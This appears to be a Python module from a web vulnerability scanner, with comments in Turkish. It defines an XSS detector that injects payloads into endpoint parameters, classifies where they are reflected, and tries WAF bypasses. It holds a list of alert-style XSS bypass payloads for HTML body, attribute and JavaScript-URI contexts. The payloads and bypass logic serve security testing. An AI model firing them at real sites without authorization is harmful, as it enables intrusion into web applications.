import hashlib
import re

from ..core.base_detector import BaseDetector
from ..payloads.xss import DOM_SINKS, DOM_SOURCES, gen_xss_payloads, CONTEXT_PREFIXES, POLYGLOT_PAYLOADS


class XSSDetector(BaseDetector):
    """Dalfox + XSStrike inspired XSS tespiti — context-aware, WAF-bypass, DOM analysis."""

    def __init__(self, session=None, timeout=8, ai_engine=None, mode='fast', custom_payloads=None, stealth=True):
        super().__init__(session, timeout, ai_engine, mode, custom_payloads, stealth)

    def _marker_for(self, param):
        return hashlib.md5(param.encode()).hexdigest()[:8]

    def _detect_context(self, resp_text, marker):
        """Payload'ın hangi bağlamda yansıdığını tespit et."""
        if f'>{marker}<' in resp_text:
            return 'html-body'
        if f'="{marker}"' in resp_text or f"='{marker}'" in resp_text:
            return 'html-attribute'
        if f'javascript:{marker}' in resp_text:
            return 'javascript-uri'
        if f'url({marker})' in resp_text:
            return 'css-url'
        if marker in resp_text:
            return 'reflected-unknown'
        return None

    def _test_context_specific_bypass(self, endpoint, param, context, marker):
        """Tespit edilen bağlama göre hedefli bypass payload'ları dene."""
        bypass_payloads = {
            'html-body': [
                f'<img src=x onerror=alert({marker})>',
                f'<svg/onload=alert({marker})>',
                f'<details open ontoggle=alert({marker})>',
                f'<body onload=alert({marker})>',
                f'<iframe srcdoc="<script>alert({marker})</script>">',
                f'<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert({marker})>">',
            ],
            'html-attribute': [
                f'" onfocus=alert({marker}) autofocus="',
                f"' onfocus=alert({marker}) autofocus='",
                f'" onmouseover=alert({marker}) "',
                f"' onmouseover=alert({marker}) '",
                f'" onfocus=alert({marker}) onmouseover=alert({marker}) "',
                f'" onfocus=alert({marker}) autofocus="',
                f'" style="background:url(javascript:alert({marker}))"',
            ],
            'javascript-uri': [
                f'alert({marker})',
                f'alert`{marker}`',
                f'confirm({marker})',
                f'prompt({marker})',
            ],
        }
        for payload in bypass_payloads.get(context, []):
            yield payload

    def test(self, endpoint):
        results = []
        if not endpoint or not endpoint.get('params'):
            return results

        method = endpoint.get('method', 'GET')

        for param, method in self._iterate_params(endpoint):
            marker = self._marker_for(param)
            context_found = None
            all_payloads = list(gen_xss_payloads(marker))
            if self.mode == 'fast':
                all_payloads = all_payloads[:10]
            elif self.mode == 'fuzz':
                all_payloads = all_payloads[:200]
            else:
                all_payloads = all_payloads[:40]

            for payload in all_payloads:
                try:
                    if method == 'GET':
                        resp, _, url = self._request_get(endpoint, param, payload)
                    else:
                        resp, _ = self._request_post(endpoint, param, payload)
                        url = endpoint['url']

                    if self._is_waf_blocking(resp):
                        # WAF bypass dene
                        for bp_resp, bp_elapsed, bp_url, bp_payload in self._request_with_bypass(
                            endpoint, param, payload, 'xss'
                        ):
                            if not self._is_waf_blocking(bp_resp):
                                if self.analyzer.reflected_marker(bp_resp.text, payload):
                                    results.append(self._make_result(
                                        'xss', bp_url, param, bp_payload, 'high', 'waf-bypass-reflected',
                                        hint=f'WAF bypass ile payload yansıdı. dalfox url "{bp_url}" -p {param} ile doğrulayın',
                                    ))
                                    break
                                if self.analyzer.reflected_marker(bp_resp.text, marker):
                                    results.append(self._make_result(
                                        'xss', bp_url, param, bp_payload, 'high', 'waf-bypass-marker',
                                        hint=f'WAF bypass ile marker ({marker}) yansıdı — XSS olası. dalfox/XSStrike ile doğrulayın',
                                    ))
                                    break
                        continue

                    # Tam yansıma kontrolü
                    if self.analyzer.reflected_marker(resp.text, payload):
                        context = self._detect_context(resp.text, marker)
                        results.append(self._make_result(
                            'xss', url, param, payload, 'high', f'reflected-exact ({context or "unknown"})',
                            hint=f'Payload yansıdı (bağlam: {context}). dalfox url "{url}" -p {param} ile doğrulayın',
                        ))
                        break

                    # Marker yansıması
                    if self.analyzer.reflected_marker(resp.text, marker):
                        context = self._detect_context(resp.text, marker)
                        results.append(self._make_result(
                            'xss', url, param, payload, 'high', f'reflected-marker ({context or "unknown"})',
                            hint=f'Marker ({marker}) yansıdı — XSS olası. Bağlam: {context}. dalfox/XSStrike ile doğrulayın',
                        ))
                        context_found = context
                        break

                    # Kısmi yansıma
                    if self.analyzer.reflected_partial(resp.text, payload):
                        results.append(self._make_result(
                            'xss', url, param, payload, 'medium', 'partial-reflection',
                            hint='Kısmi yansıma — filtre bypass denemeleri için XSStrike kullanın',
                        ))
                        break

                except Exception:
                    continue

            # Context-aware bypass
            if context_found and context_found != 'reflected-unknown':
                for bypass_payload in self._test_context_specific_bypass(endpoint, param, context_found, marker):
                    try:
                        if method == 'GET':
                            resp, _, url = self._request_get(endpoint, param, bypass_payload)
                        else:
                            resp, _ = self._request_post(endpoint, param, bypass_payload)
                            url = endpoint['url']

                        if self.analyzer.reflected_marker(resp.text, marker):
                            results.append(self._make_result(
                                'xss', url, param, bypass_payload, 'high', f'context-bypass ({context_found})',
                                hint=f'Bağlam-aware bypass ile marker yansıdı. dalfox url "{url}" -p {param} ile test edin',
                            ))
                            break
                    except Exception:
                        continue

            # DOM XSS hint (Dalfox static analysis)
            try:
                if method == 'GET':
                    resp, _, url = self._request_get(endpoint, param, 'test')
                else:
                    resp, _ = self._request_post(endpoint, param, 'test')
                    url = endpoint['url']

                body = resp.text
                has_sink = self.analyzer.match_any(body, DOM_SINKS, case_insensitive=False)
                has_source = self.analyzer.match_any(body, DOM_SOURCES, case_insensitive=False)
                if has_sink and has_source:
                    results.append(self._make_result(
                        'xss', url, param, 'DOM analysis', 'low', 'dom-hint',
                        hint=f'DOM kaynak ({has_source}) + sink ({has_sink}) bulundu — DOM XSS manuel test edin',
                    ))
            except Exception:
                pass

        return results
